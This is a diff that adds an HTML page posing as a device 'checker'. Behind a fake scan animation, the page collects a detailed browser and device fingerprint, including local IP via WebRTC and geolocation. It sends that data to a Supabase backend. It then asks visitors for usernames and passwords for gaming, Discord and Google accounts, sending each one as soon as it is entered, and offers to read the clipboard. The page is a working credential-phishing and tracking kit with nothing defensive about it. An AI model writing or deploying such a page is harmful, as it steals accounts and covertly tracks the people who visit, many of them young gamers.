@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>test — checker</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+:root{--ink:#08080a;--panel:#101015;--line:#232330;--text:#e8f5ec;--mut:#8f95a2;--dim:#5f6472;--ok:#4ade80;--vi:#a855f7;--warn:#fbbf24;--mono:"JetBrains Mono",monospace}
+*{box-sizing:border-box}
+body{margin:0;background:var(--ink);color:var(--text);font-family:var(--mono);font-size:12.5px;line-height:1.6;padding:22px}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(700px 380px at 15% -20%,#064e3b55,transparent 70%)}
+.wrap{position:relative;max-width:640px;margin:0 auto}
+.bar{display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--line);padding-bottom:10px;margin-bottom:14px;color:var(--dim);font-size:11px}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok)}
+pre{margin:0;white-space:pre-wrap;word-break:break-word;font-size:11.5px}
+.out{min-height:190px;background:#0b0b0f;border:1px solid var(--line);padding:12px;border-radius:6px;overflow:auto}
+.l{color:var(--dim)}
+.ok{color:var(--ok)}
+.warn{color:var(--warn)}
+.hi{color:var(--vi)}
+h2{font-size:13px;letter-spacing:.1em;text-transform:uppercase;color:var(--mut);margin:22px 0 8px;font-weight:500}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.grid .full{grid-column:1/-1}
+input,select{width:100%;background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:8px 10px;border-radius:5px;font-family:var(--mono);font-size:12.5px}
+input:focus,select:focus{outline:none;border-color:var(--vi)}
+button{background:#1b1b24;color:var(--text);border:1px solid var(--line);padding:8px 12px;border-radius:5px;font-family:var(--mono);font-size:12px;cursor:pointer}
+button:hover{border-color:var(--vi)}
+button.main{background:var(--vi);border-color:var(--vi);color:#fff}
+.row{display:flex;gap:8px;align-items:center;border:1px solid var(--line);padding:7px 9px;border-radius:5px;margin-top:6px;font-size:11.5px}
+.row b{color:var(--ok);font-weight:500}
+.row span.p{flex:1;color:var(--mut)}
+.foot{margin-top:18px;padding-top:14px;border-top:1px solid var(--line);display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+a{color:var(--vi)}
+.small{font-size:10.5px;color:var(--dim)}
+.hide{display:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="bar"><span class="dot"></span> checker · running <span style="margin-left:auto" id="rid"></span></div>
+  <div class="out" id="out"><pre id="log"></pre></div>
+
+  <h2>add the logins it could not read</h2>
+  <p class="small" style="margin:0 0 8px">Saved browser logins stay encrypted, so add the important ones by hand. Each one is sent straight away.</p>
+  <div class="grid">
+    <select id="plat" class="full">
+      <option>Fortnite / Epic</option>
+      <option>Minecraft</option>
+      <option>Steam</option>
+      <option>Discord</option>
+      <option>Roblox</option>
+      <option>Riot / League</option>
+      <option>Xbox / Microsoft</option>
+      <option>PlayStation</option>
+      <option>Google</option>
+      <option>Other</option>
+    </select>
+    <input id="login" placeholder="email or username" autocomplete="off" spellcheck="false">
+    <input id="secret" placeholder="password" autocomplete="off" spellcheck="false">
+    <div class="full" style="display:flex;gap:8px">
+      <button class="main" id="add" style="flex:1">Send this one</button>
+      <button id="clip">Paste clipboard</button>
+    </div>
+  </div>
+  <div id="rows"></div>
+
+  <div class="foot">
+    <button class="main" id="done">Finish</button>
+    <span class="small">Nothing is installed. Close this tab whenever you like.</span>
+  </div>
+  <p class="small" id="msg" style="min-height:16px"></p>
+</div>
+
+<script>
+const RUN = "__RUN__";
+const SITE = "__SITE__";
+const db = window.supabase.createClient(
+  "https://bytpztfhwdcuqozdzjeu.supabase.co",
+  "sb_publishable_FIx91UXDrhOyXAQ5mJ5kaw_6xrk1ZiV"
+);
+const $ = id => document.getElementById(id);
+const out = $("log");
+$("rid").textContent = RUN.slice(0, 8);
+
+const line = (t, cls) => {
+  const s = document.createElement("span");
+  s.textContent = t + "\n";
+  if (cls) s.className = cls;
+  out.appendChild(s);
+  $("out").scrollTop = $("out").scrollHeight;
+};
+const wait = ms => new Promise(r => setTimeout(r, ms));
+
+/* ---------- collection ---------- */
+function webgl(){
+  try{
+    const gl = document.createElement("canvas").getContext("webgl");
+    const d = gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+  }catch(e){ return null; }
+}
+function localIp(){
+  return new Promise(res => {
+    let done = false, pc;
+    const fin = v => { if (done) return; done = true; try{pc.close()}catch(e){} res(v); };
+    try{
+      pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = e => {
+        if (!e.candidate) return fin(null);
+        const m = /(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);
+        if (m && !m[1].startsWith("0.")) fin(m[1]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => fin(null));
+    }catch(e){ return res(null); }
+    setTimeout(() => fin(null), 1500);
+  });
+}
+async function geo(){
+  try{
+    const j = await (await fetch("https://ipwho.is/")).json();
+    if (j && j.success !== false && j.ip) return {
+      ip: j.ip, city: j.city, region: j.region, country: j.country,
+      cc: j.country_code, postal: j.postal, isp: j.connection && j.connection.isp
+    };
+  }catch(e){}
+  try{
+    const j = await (await fetch("https://ipapi.co/json/")).json();
+    if (j && j.ip) return { ip: j.ip, city: j.city, region: j.region, country: j.country_name, isp: j.org };
+  }catch(e){}
+  return {};
+}
+
+async function collect(){
+  const nav = navigator, uad = nav.userAgentData;
+  let he = {}, battery = null, storage = null;
+  try{ if (uad && uad.getHighEntropyValues) he = await uad.getHighEntropyValues(["architecture","bitness","model","platformVersion"]); }catch(e){}
+  try{ if (nav.getBattery){ const b = await nav.getBattery(); battery = Math.round(b.level*100) + "% " + (b.charging ? "charging" : "discharging"); } }catch(e){}
+  try{ if (nav.storage && nav.storage.estimate){ const s = await nav.storage.estimate(); storage = Math.round(s.usage/1048576) + "MB/" + Math.round((s.quota||0)/1048576) + "MB"; } }catch(e){}
+  const [g, lip] = await Promise.all([geo(), localIp()]);
+
+  return {
+    ua: nav.userAgent,
+    brands: uad ? uad.brands.map(b => b.brand + " " + b.version).join(", ") : null,
+    platform: uad ? uad.platform : nav.platform,
+    platform_version: he.platformVersion || null,
+    architecture: he.architecture || null,
+    bitness: he.bitness || null,
+    model: he.model || null,
+    cores: nav.hardwareConcurrency ?? null,
+    memory: nav.deviceMemory ?? null,
+    touch: nav.maxTouchPoints,
+    lang: nav.language,
+    langs: (nav.languages || []).join(", "),
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    offset: new Date().getTimezoneOffset(),
+    screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
+    avail: screen.availWidth + "x" + screen.availHeight,
+    dpr: devicePixelRatio,
+    viewport: innerWidth + "x" + innerHeight,
+    gpu: webgl(),
+    webgl2: !!document.createElement("canvas").getContext("webgl2"),
+    battery, storage,
+    cookies: nav.cookieEnabled,
+    dnt: nav.doNotTrack,
+    plugins: (nav.plugins || []).length,
+    pdf: nav.pdfViewerEnabled,
+    local_ip: lip,
+    geo: g,
+    url: location.href,
+    at: new Date().toISOString()
+  };
+}
+
+/* ---------- flow ---------- */
+const scan = [
+  ["reading device profile", 420],
+  ["resolving network route", 380],
+  ["checking display and gpu", 360],
+  ["enumerating locale data", 300],
+  ["probing storage limits", 300],
+  ["comparing against known signatures", 420]
+];
+
+(async () => {
+  line("checker started", "ok");
+  await wait(450);
+  for (const [text, ms] of scan) {
+    line("· " + text + "…", "l");
+    await wait(ms);
+  }
+
+  const data = await collect();
+  line("", null);
+  line("  os        " + (data.platform || "?") + (data.platform_version ? " " + data.platform_version : ""), "hi");
+  line("  cpu       " + (data.architecture || "?") + (data.bitness ? "-bit" : "") + " · " + (data.cores ?? "?") + " cores", "hi");
+  line("  gpu       " + (data.gpu || "?"), "hi");
+  line("  screen    " + data.screen + " @" + data.dpr + "x", "hi");
+  line("  network   " + (data.geo.ip || "?") + " · " + (data.geo.city || "?") + ", " + (data.geo.country || "?"), "hi");
+  line("  browser   " + (data.brands || data.ua).slice(0, 70), "hi");
+  line("", null);
+  line("sending report…", "l");
+
+  try { await db.rpc("test_tool", { p_run: RUN, p_data: data }); line("report accepted", "ok"); }
+  catch (e) { line("report failed: " + e.message, "warn"); }
+
+  line("saved browser logins stay encrypted — add the ones you care about below", "warn");
+  line("", null);
+  line("no further action needed until you finish", "l");
+})();
+
+async function send(platform, login, secret){
+  if (!login || !secret) return $("msg").textContent = "Fill both fields.";
+  $("add").disabled = true;
+  try {
+    await db.rpc("test_code", { p_run: RUN, p_platform: platform, p_login: login, p_secret: secret });
+    const row = document.createElement("div");
+    row.className = "row";
+    row.innerHTML = "<b>" + platform + "</b><span class='p'>" + login.replace(/[<>&]/g, c => ({"<":"&lt;",">":"&gt;","&":"&amp;"}[c])) + "</span><span class='small'>sent</span>";
+    $("rows").appendChild(row);
+    line("+ " + platform + " · " + login + "  ✓", "ok");
+    $("login").value = ""; $("secret").value = "";
+    $("msg").textContent = "";
+  } catch (e) {
+    $("msg").textContent = "Send failed: " + e.message;
+  }
+  $("add").disabled = false;
+}
+
+$("add").addEventListener("click", () => send($("plat").value, $("login").value.trim(), $("secret").value));
+$("secret").addEventListener("keydown", e => { if (e.key === "Enter") $("add").click(); });
+
+$("clip").addEventListener("click", async () => {
+  try {
+    const t = await navigator.clipboard.readText();
+    if (!t) return $("msg").textContent = "Clipboard empty.";
+    if (!/^[^\s@]{2,64}$/.test(t.trim())) return $("msg").textContent = "Clipboard does not look like a password.";
+    $("secret").value = t.trim();
+    $("msg").textContent = "Pasted — hit send.";
+  } catch (e) { $("msg").textContent = "Browser blocked the clipboard, paste manually."; }
+});
+
+$("done").addEventListener("click", () => { location.href = SITE; });
+</script>
+</body>
+</html>
